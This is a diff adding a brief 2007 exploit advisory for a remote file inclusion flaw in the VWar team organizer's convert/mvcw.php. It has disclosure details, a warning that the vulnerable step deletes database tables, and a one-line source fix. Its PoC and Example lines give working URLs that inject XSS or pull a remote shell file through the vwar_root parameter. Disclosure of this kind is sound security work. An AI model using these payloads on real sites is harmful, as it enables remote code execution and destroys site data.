@@ -1,0 +1,41 @@
+                            \#'#/
+                            (-.-)
+   --------------------oOO---(_)---OOo--------------------
+   | VWar <= v1.5.0 R15 (mvcw.php) Remote File Inclusion |
+   |                    coded by DNX                     |
+   -------------------------------------------------------
+[!] Discovered: DNX
+[!] Vendor: http://www.vwar.de
+[!] Detected: 26.02.2007
+[!] Reported: 27.02.2007
+[!] Remote: yes
+
+[!] Background: VWar is a team organizer based on PHP and MySQL
+
+[!] Bug: $vwar_root in convert/mvcw.php
+
+[!] PoC:
+    - http://[site]/[path]/convert/mvcw.php?vwar_root=[xss]
+    - http://[site]/[path]/convert/mvcw.php?step=1&vwar_root=[shell]
+
+[!] Example:
+    - http://127.0.0.1/vwar/convert/mvcw.php?step=1&vwar_root=http//127.0.0.1/shell.txt?
+
+[!] Warning: "step=1" deletes all data from the tables vwar, vwar_opponents,
+    vwar_scores and vwar_screen in the database
+
+[!] Solution: No update from vendor till now
+
+[!] Quick fix in convert/mvcw.php line 79:
+    - replace:
+	if ($GPC['step'] == 1)
+	{
+		// clean tables
+
+    - with:
+	if ($GPC['step'] == 1)
+	{
+		$vwar_root = "./../";
+		// clean tables
+
+# milw0rm.com [2007-08-28]
